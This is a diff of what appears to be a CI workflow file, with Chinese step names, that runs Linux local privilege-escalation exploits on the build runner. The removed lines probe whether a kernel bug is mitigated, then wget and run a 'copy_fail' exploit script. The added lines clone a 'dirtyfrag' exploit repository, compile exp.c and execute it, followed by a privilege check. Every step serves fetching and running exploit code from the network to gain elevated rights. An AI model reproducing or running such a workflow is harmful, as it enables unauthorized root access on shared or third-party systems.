@@ -27,19 +27,13 @@ jobs:
       run: |
         uname -a
 
-    - name: 检测是否缓解
+    - name: 安装gcc
       run: |
-        python3 -c 'import socket; s=socket.socket(38,5,0); (s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))")) or print("未缓解")) if s else None' 2>/dev/null || echo "已缓解"
+        apt install gcc -y
 
-        
     - name: 下载提权脚本
       run: |
-        wget https://github.com/theori-io/copy-fail-CVE-2026-31431/raw/main/copy_fail_exp.py 
-
-    - name: 执行提权脚本
-      run: |
-        python3 copy_fail_exp.py && whoami
-
+        git clone https://github.com/V4bel/dirtyfrag.git&& cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 
     - name: 检查权限
       run: |
